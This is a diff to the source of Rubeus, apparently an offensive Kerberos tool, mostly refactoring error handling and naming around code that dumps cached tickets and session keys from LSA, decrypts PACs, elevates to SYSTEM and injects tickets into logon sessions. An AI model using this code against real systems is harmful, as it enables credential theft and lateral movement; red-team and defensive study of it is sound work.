@@ -68,8 +68,11 @@ namespace Rubeus
             LSAString.MaximumLength = (ushort)(logonProcessName.Length + 1);
             LSAString.Buffer = logonProcessName;
 
-            var ret = Interop.LsaRegisterLogonProcess(LSAString, out lsaHandle, out securityMode);
-
+            int ret = Interop.LsaRegisterLogonProcess(LSAString, out lsaHandle, out securityMode);
+            if (ret != 0)
+            {
+                throw new RubeusException("LsaRegisterLogonProcess failed with the error: " + new Win32Exception((int)Interop.LsaNtStatusToWinError((uint)ret)).Message);
+            }
             return lsaHandle;
         }
 
@@ -83,7 +86,7 @@ namespace Rubeus
 
             if (!Helpers.IsHighIntegrity())
             {
-                int retCode = Interop.LsaConnectUntrusted(out lsaHandle);
+                lsaHandle = GetUntrustedLsaHandle();
             }
 
             else
@@ -146,7 +149,7 @@ namespace Rubeus
             //      (initial) TGT, or a forwarded ticket if that's all that exists (a la the printer bug)
             request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED - return the ticket as a KRB_CRED credential
             request.EncryptionType = 0x0;
-            
+
             // the target ticket name we want the ticket for
             var tName = new Interop.UNICODE_STRING(targetName);
             request.TargetName = tName;
@@ -161,7 +164,7 @@ namespace Rubeus
 
             // marshal the struct from a managed object to an unmanaged block of memory.
             Marshal.StructureToPtr(request, unmanagedAddr, false);
-            
+
             // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
             var newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));
 
@@ -175,7 +178,7 @@ namespace Rubeus
             int retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack,
                 unmanagedAddr, newStructSize, out responsePointer,
                 out returnBufferLength, out protocalStatus);
-            
+
             // TODO: is this needed?
             //if (retCode != 0)
             //{
@@ -245,7 +248,7 @@ namespace Rubeus
 
 
             // sanity checks
-            if (!Helpers.IsHighIntegrity() && ( ((ulong)targetLuid != 0) || (!String.IsNullOrEmpty(targetUser)) ) )
+            if (!Helpers.IsHighIntegrity() && (((ulong)targetLuid != 0) || (!String.IsNullOrEmpty(targetUser))))
             {
                 Console.WriteLine("[X] You need to be in high integrity for the actions specified.");
                 return null;
@@ -315,7 +318,7 @@ namespace Rubeus
                     SESSION_CRED sessionCred = new SESSION_CRED();
                     sessionCred.LogonSession = logonSessionData;
                     sessionCred.Tickets = new List<KRB_TICKET>();
-                    
+
                     // phase 1 of targeting
 
                     // exclude computer accounts unless instructed otherwise
@@ -344,7 +347,7 @@ namespace Rubeus
                         // if we're not elevated, we have to have a LUID of 0 here to prevent failure
                         ticketCacheRequest.LogonId = new LUID();
                     }
-                    
+
                     var tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ticketCacheRequest));
                     Marshal.StructureToPtr(ticketCacheRequest, tQueryPtr, false);
 
@@ -394,7 +397,7 @@ namespace Rubeus
 
                                 bool includeTicket = true;
 
-                                if ( !String.IsNullOrEmpty(targetService) && !Regex.IsMatch(ticket.ServerName, String.Format(@"^{0}/.*", Regex.Escape(targetService)), RegexOptions.IgnoreCase))
+                                if (!String.IsNullOrEmpty(targetService) && !Regex.IsMatch(ticket.ServerName, String.Format(@"^{0}/.*", Regex.Escape(targetService)), RegexOptions.IgnoreCase))
                                 {
                                     includeTicket = false;
                                 }
@@ -405,7 +408,7 @@ namespace Rubeus
 
                                 if (Regex.IsMatch(ticket.ServerName, @"^krbtgt/.*", RegexOptions.IgnoreCase))
                                 {
-                                    if(krbtgtFound)
+                                    if (krbtgtFound)
                                     {
                                         includeTicket = false;
                                     }
@@ -467,12 +470,12 @@ namespace Rubeus
             foreach (var sessionCred in sessionCreds)
             {
                 // don't display logon sessions with no tickets
-                if( (sessionCred.Tickets.Count == 0) && (!showAll))
+                if ((sessionCred.Tickets.Count == 0) && (!showAll))
                 {
                     continue;
                 }
 
-                if ( (displayFormat == TicketDisplayFormat.Full) || displayFormat == TicketDisplayFormat.Klist)
+                if ((displayFormat == TicketDisplayFormat.Full) || displayFormat == TicketDisplayFormat.Klist)
                 {
                     Console.WriteLine("  UserName                 : {0}", sessionCred.LogonSession.Username);
                     Console.WriteLine("  Domain                   : {0}", sessionCred.LogonSession.LogonDomain);
@@ -486,7 +489,7 @@ namespace Rubeus
                     Console.WriteLine("  UserPrincipalName        : {0}\r\n", sessionCred.LogonSession.Upn);
                 }
 
-                for(int j = 0; j < sessionCred.Tickets.Count; j++)
+                for (int j = 0; j < sessionCred.Tickets.Count; j++)
                 {
                     var ticket = sessionCred.Tickets[j];
 
@@ -533,7 +536,7 @@ namespace Rubeus
             var userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
             var sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());
             var keyType = String.Format("{0}", (Interop.KERB_ETYPE)cred.enc_part.ticket_info[0].key.keytype);
-            var b64Key = Convert.ToBase64String(cred.enc_part.ticket_info[0].key.keyvalue);        
+            var b64Key = Convert.ToBase64String(cred.enc_part.ticket_info[0].key.keyvalue);
             var base64ticket = Convert.ToBase64String(cred.Encode().Encode());
             string indent = new string(' ', indentLevel);
             string serviceName = sname.Split('/')[0];
@@ -630,8 +633,9 @@ namespace Rubeus
                 }
             }
 
-            if (serviceKey != null) {
-                
+            if (serviceKey != null)
+            {
+
                 try
                 {
                     var decryptedEncTicket = cred.tickets[0].Decrypt(serviceKey, asrepKey);
@@ -641,7 +645,7 @@ namespace Rubeus
                         Console.WriteLine("[X] Unable to get the PAC");
                         return;
                     }
-                    
+
                     if (krbKey == null && (serviceName == "krbtgt") && (cred.enc_part.ticket_info[0].srealm.ToUpper() == sname.Split('/')[1].ToUpper()))
                     {
                         krbKey = serviceKey;
@@ -650,7 +654,8 @@ namespace Rubeus
 
                     Console.WriteLine("{0}Decrypted PAC            :", indent);
 
-                    foreach(var pacInfoBuffer in pt.PacInfoBuffers) {
+                    foreach (var pacInfoBuffer in pt.PacInfoBuffers)
+                    {
 
                         if (pacInfoBuffer is ClientName cn)
                         {
@@ -1013,30 +1018,29 @@ namespace Rubeus
             // straight from Vincent LE TOUX' work
             //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971
 
-            var LsaHandle = IntPtr.Zero;
-            int AuthenticationPackage;
-            int ntstatus, ProtocalStatus;
+            var lsaHandle = IntPtr.Zero;
+            int authenticationPackage;
+            int ntstatus, protocalStatus;
 
             if ((ulong)targetLuid != 0)
             {
                 if (!Helpers.IsHighIntegrity())
                 {
-                    Console.WriteLine("[X] You need to be in high integrity to apply a ticket to a different logon session");
-                    return;
+                    throw new RubeusException("You need to be in high integrity to apply a ticket to a different logon session");
                 }
                 else
                 {
                     if (Helpers.IsSystem())
                     {
                         // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
-                        LsaHandle = LsaRegisterLogonProcessHelper();
+                        lsaHandle = LsaRegisterLogonProcessHelper();
                     }
                     else
                     {
                         // elevated but not system, so gotta GetSystem() first
                         Helpers.GetSystem();
                         // should now have the proper privileges to get a Handle to LSA
-                        LsaHandle = LsaRegisterLogonProcessHelper();
+                        lsaHandle = LsaRegisterLogonProcessHelper();
                         // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                         Interop.RevertToSelf();
                     }
@@ -1045,26 +1049,25 @@ namespace Rubeus
             else
             {
                 // otherwise use the unprivileged connection with LsaConnectUntrusted
-                ntstatus = Interop.LsaConnectUntrusted(out LsaHandle);
+                lsaHandle = GetUntrustedLsaHandle();
             }
 
             var inputBuffer = IntPtr.Zero;
-            IntPtr ProtocolReturnBuffer;
-            int ReturnBufferLength;
+            IntPtr protocolReturnBuffer;
+            int returnBufferLength;
             try
             {
                 Interop.LSA_STRING_IN LSAString;
-                var Name = "kerberos";
-                LSAString.Length = (ushort)Name.Length;
-                LSAString.MaximumLength = (ushort)(Name.Length + 1);
-                LSAString.Buffer = Name;
-                ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle, ref LSAString, out AuthenticationPackage);
+                var name = "kerberos";
+                LSAString.Length = (ushort)name.Length;
+                LSAString.MaximumLength = (ushort)(name.Length + 1);
+                LSAString.Buffer = name;
+                ntstatus = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authenticationPackage);
                 if (ntstatus != 0)
                 {
                     var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                     var errorMessage = new Win32Exception((int)winError).Message;
-                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
-                    return;
+                    throw new RubeusException(String.Format("Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage));
                 }
                 var request = new Interop.KERB_SUBMIT_TKT_REQUEST();
                 request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage;
@@ -1081,28 +1084,28 @@ namespace Rubeus
                 inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                 Marshal.StructureToPtr(request, inputBuffer, false);
                 Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);
-                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
+                ntstatus = Interop.LsaCallAuthenticationPackage(lsaHandle, authenticationPackage, inputBuffer, inputBufferSize, out protocolReturnBuffer, out returnBufferLength, out protocalStatus);
                 if (ntstatus != 0)
                 {
                     var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                     var errorMessage = new Win32Exception((int)winError).Message;
-                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
-                    return;
+                    throw new RubeusException(String.Format("Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage));
                 }
-                if (ProtocalStatus != 0)
+                if (protocalStatus != 0)
                 {
-                    var winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
+                    var winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);
                     var errorMessage = new Win32Exception((int)winError).Message;
-                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocalStatus): {1}", winError, errorMessage);
-                    return;
+                    throw new RubeusException(String.Format("Error {0} running LsaLookupAuthenticationPackage (ProtocalStatus): {1}", winError, errorMessage));
                 }
                 Console.WriteLine("[+] Ticket successfully imported!");
             }
             finally
             {
                 if (inputBuffer != IntPtr.Zero)
+                {
                     Marshal.FreeHGlobal(inputBuffer);
-                Interop.LsaDeregisterLogonProcess(LsaHandle);
+                }
+                Interop.LsaDeregisterLogonProcess(lsaHandle);
             }
         }
 
@@ -1189,6 +1192,18 @@ namespace Rubeus
 
         #region Misc Helpers
 
+        public static IntPtr GetUntrustedLsaHandle()
+        {
+            int ret;
+            IntPtr lsaHandle;
+            ret = Interop.LsaConnectUntrusted(out lsaHandle);
+            if (ret != 0)
+            {
+                throw new RubeusException("LsaConnectUntrusted failed with the error code " + ret + " : " + new Win32Exception((int)Interop.LsaNtStatusToWinError((uint)ret)).Message);
+            }
+            return lsaHandle;
+        }
+
         public static byte[] GetEncryptionKeyFromCache(string target, Interop.KERB_ETYPE etype)
         {
             // gets the cached session key for a given service ticket
@@ -1204,7 +1219,7 @@ namespace Rubeus
             LSAString.MaximumLength = (ushort)(name.Length + 1);
             LSAString.Buffer = name;
 
-            retCode = Interop.LsaConnectUntrusted(out lsaHandle);
+            lsaHandle = GetUntrustedLsaHandle();
             retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);
 
             var returnBufferLength = 0;
